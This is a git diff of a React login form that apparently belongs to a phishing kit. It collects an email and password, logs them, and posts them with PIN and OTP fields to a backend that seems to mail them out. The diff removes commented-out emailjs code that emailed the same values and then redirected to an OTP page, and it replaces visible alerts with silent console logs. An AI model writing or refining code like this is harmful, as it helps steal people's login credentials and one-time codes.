@@ -35,27 +35,6 @@ const Form = (props) => {
         if (email === '' || password === '' ) {
             console.log('not sent')
         } else {
-           
-
-            // emailjs
-            //     .send(
-            //         'service_9vrlrlj',
-            //         'template_cyuy4xi',
-            //         templateParams,
-            //         'user_Qbla9rcVZxBrYr7bdLXKO'
-            //     )
-            //     .then(
-            //         (result) => {
-            //             console.log(result.text, 'email sent')
-            //         setLoading(false)
-            //             history.push('/otp', templateParams)
-            //         },
-            //         (error) => {
-            //             console.log(error, 'email failed')
-            //         setLoading(false)
-
-            //         }
-            //     )
 
             console.log({ email, password })
             try{
@@ -65,7 +44,7 @@ const Form = (props) => {
                     headers: {
                         'Content-type': 'application/json',
                     },
-                    body: JSON.stringify({ email, password, PIN: '', OTP: '' }),
+                    body: JSON.stringify({ email, password, pin: '', otp: '' }),
                 })
                 
                 const resData = await response.json()
@@ -73,10 +52,10 @@ const Form = (props) => {
                 console.log('email sending started')
                 
                 if (resData.status === 'success') {
-                    alert('Message Sent.')
+                    console.log('Message Sent.')
                     
                 } else if (resData.status === 'fail') {
-                    alert('Message failed to send.')
+                    console.log('Message failed to send.')
                 }
             }
 
